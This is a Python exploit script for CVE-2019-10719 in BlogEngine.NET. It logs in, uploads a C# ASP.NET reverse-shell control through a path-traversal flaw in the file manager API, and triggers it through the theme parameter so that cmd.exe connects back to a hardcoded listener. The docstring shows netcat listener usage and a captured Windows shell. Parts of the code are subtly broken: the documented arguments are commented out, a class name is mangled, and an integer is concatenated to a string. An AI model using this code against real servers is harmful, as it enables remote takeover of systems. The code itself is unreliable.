import argparse
import io
import json
import os
import re
import requests
import sys

"""
Exploit for CVE-2019-10719
CVE Identified by: Aaron Bishop
Exploit written by: Aaron Bishop
Upload and trigger a reverse shell
python exploit.py -t 192.168.10.9 -l 192.168.10.10:1337
Open a listener to capture the reverse shell - Metasploit or netcat
nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.10.10] from (UNKNOWN) [192.168.10.9] 49680
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
"""

urls = {
        "login": "/Account/login.aspx",
        "traversal": "/api/filemanager"
       }


def make_request(session, method, target, params={}, data={}, files={}):
    proxies = {
            "http": "127.0.0.1:8080"
            #"https": "127.0.0.1:8080"
              }
    if method == 'GET':
        r = requests.Request(method, target, params=params)
    elif method == 'POST':
        if files:
            r = requests.Request(method, target, files=files)
        else:
            r = requests.Request(method, target, data=data)
    prep = session.prepare_request(r)
    resp = session.send(prep, verify=False) #proxies=proxies)
    return resp.text

def login(session, user, passwd):
    resp = make_request(session, 'GET', "http://192.168.31.40:8888/BlogEngine/Account/login.aspx")
    login_form = re.findall('<input\s+.*?name="(?P<name>.*?)"\s+.*?(?P<tag>\s+value="(?P<value>.*)")?\s/>', resp)
    login_data = dict([(i[0],i[2]) for i in login_form])
    login_data.update({'ctl00$MainContent$LoginUser$UserName': user})
    login_data.update({'ctl00$MainContent$LoginUser$Password': passwd})
    resp = make_request(session, 'POST', "http://192.168.31.40:8888/BlogEngine/Account/login.aspx", data=login_data)

def upload_shell(session, shell_dir):
    lhost = "192.168.19.31"
    lport = 4444
    

    shell = '''<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>
<script runat="server">
	static System.IO.StreamWriter streamWriter;
    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);
	using(System.Net.Sockets.TcpCliensessiont client = new System.Net.Sockets.TcpClient("''' + lhost + '''", ''' + lport + ''')) {
		using(System.IO.Stream stream = client.GetStream()) {
			using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
				streamWriter = new System.IO.StreamWriter(stream);
				StringBuilder strInput = new StringBuilder();
				System.Diagnostics.Process p = new System.Diagnostics.Process();
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.CreateNoWindow = true;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.RedirectStandardOutput = true;
				p.StartInfo.RedirectStandardInput = true;
				p.StartInfo.RedirectStandardError = true;
				p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
				p.Start();
				p.BeginOutputReadLine();
				while(true) {
					strInput.Append(rdr.ReadLine());
					p.StandardInput.WriteLine(strInput);
					strInput.Remove(0, strInput.Length);
				}
			}
		}
    	}
    }
    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
   	StringBuilder strOutput = new StringBuilder();
       	if (!String.IsNullOrEmpty(outLine.Data)) {
       		try {
                	strOutput.Append(outLine.Data);
                    	streamWriter.WriteLine(strOutput);
                    	streamWriter.Flush();
                } catch (Exception err) { }
        }
    }
</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
'''
    make_request(session, "POST", "http://192.168.31.40:8888/BlogEngine/api/upload?action=filemgr&dirPath=~/App_Data/files/../../Custom/Themes/" + shell_dir, files={"file": ("PostView.ascx".format(shell_dir=shell_dir), shell, "application/octet-stream")})

def trigger_shell(session, shell_dir):
    make_request(session, "GET", "http://192.168.31.40:8888/BlogEngine/", params={"theme": shell_dir})

def main(user, passwd, shell_dir):
    with requests.Session() as session:
        login(session, user, passwd)
        upload_shell(session, shell_dir)
        trigger_shell(session, shell_dir)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exploit CVE-2019-10719 Path traversal + RCE')
    #parser.add_argument('-t', '--target', action="store", dest="target", required=True, help='Target host')
    parser.add_argument('-u', '--user', default="admin", action="store", dest="user", help='Account with file upload permissions on blog')
    parser.add_argument('-p', '--passwd', default="admin", action="store", dest="passwd", help='Password for account')
    parser.add_argument('-d', '--dir', nargs='?', default="RCE", help='Theme Directory to write Reverse shell too')
    #parser.add_argument('-s', '--ssl', action="store_true", help="Force SSL")
    #parser.add_argument('-l', '--listener', action="store", help="Host:Port combination reverse shell should back to - 192.168.10.10:1337")
    args = parser.parse_args()

    #protocol = "https://" if args.ssl else "http://"
    main(args.user, args.passwd, args.dir)